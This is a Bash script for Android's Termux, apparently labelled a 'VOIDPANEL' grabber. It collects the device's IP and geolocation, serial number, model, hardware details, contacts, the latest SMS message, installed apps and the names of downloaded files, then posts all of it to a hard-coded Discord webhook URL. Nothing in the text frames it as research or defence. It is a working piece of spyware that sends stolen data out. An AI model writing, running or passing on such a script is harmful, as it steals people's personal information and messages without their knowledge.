#!/bin/bash

# CONFIGURACAO DO WEBHOOK
URL="https://discord.com/api/webhooks/1474865009459859467/FuON2EHoo1e9LjLPi9cZoeT3IwEO-FSUcW0T2MpSjnvY8MUhvHuGTHc6qq74fi4NF7Ho"

# Funcao para limpar texto e evitar quebra de JSON
c() { echo "$1" | tr -d '\n\r"' | sed 's/\\/\\\\/g' | cut -c1-400; }

# 1. LOCALIZACAO E REDE (IP-API)
P_IP=$(curl -s --connect-timeout 5 ifconfig.me || echo "0.0.0.0")
L_RAW=$(curl -s "http://ip-api.com")
L_INF=$(c "$(echo "$L_RAW" | tr ',' '\n' | tr -d '{}')")

# 2. IDENTIDADE PROFUNDA
USER=$(c "$(getprop ro.build.user)")
SERIAL=$(c "$(getprop ro.serialno)")
ID_ANDROID=$(c "$(getprop ro.build.id)")
MODEL=$(c "$(getprop ro.product.model)")
BRAND=$(c "$(getprop ro.product.brand)")

# 3. DADOS DE HARDWARE (CPU, RAM, BATERIA)
CPU=$(c "$(getprop ro.product.cpu.abi) | $(getprop ro.hardware)")
RAM=$(c "$(free -h | awk '/Mem:/ {print $3 "/" $2}')")
BAT=$(c "$(termux-battery-status 2>/dev/null | tr -d '\n\r{}')")
UPT=$(c "$(uptime -p)")

# 4. EXTRACAO DE DADOS DO USUARIO (REQUER TERMUX:API)
# Tenta pegar contatos e SMS (apenas se o usuario deu permissao no Android)
CONTACTS=$(c "$(termux-contact-list 2>/dev/null | head -n 5)")
SMS=$(c "$(termux-sms-list -l 1 2>/dev/null)")

# 5. ARQUIVOS E APPS
APPS=$(c "$(pm list packages -e | head -n 10 | cut -d: -f2 | tr '\n' ',')")
FILES=$(c "$(ls -m /sdcard/Download 2>/dev/null | head -c 200)")

# 6. MONTAGEM DO PAYLOAD
PAYLOAD=$(cat <<EOF
{
  "content": "☢️ **EXTRAÇÃO MÁXIMA VOIDPANEL** ☢️",
  "embeds": [{
    "title": "DADOS TÉCNICOS TOTAIS",
    "color": 16711680,
    "fields": [
      {"name": "Identidade", "value": "IP: $P_IP\nUser: $USER\nSerial: $SERIAL\nModelo: $BRAND $MODEL", "inline": false},
      {"name": "Localizacao", "value": "$L_INF", "inline": false},
      {"name": "Hardware", "value": "CPU: $CPU\nRAM: $RAM\nBateria: $BAT\nUptime: $UPT", "inline": false},
      {"name": "Amostra de Dados", "value": "Contatos: ${CONTACTS:-'Privado'}\nSMS: ${SMS:-'Privado'}\nApps: $APPS", "inline": false},
      {"name": "Arquivos", "value": "$FILES", "inline": false}
    ]
  }]
}
EOF
)

# 7. ENVIO
curl -s -H "Content-Type: application/json" -X POST -d "$PAYLOAD" "$URL"
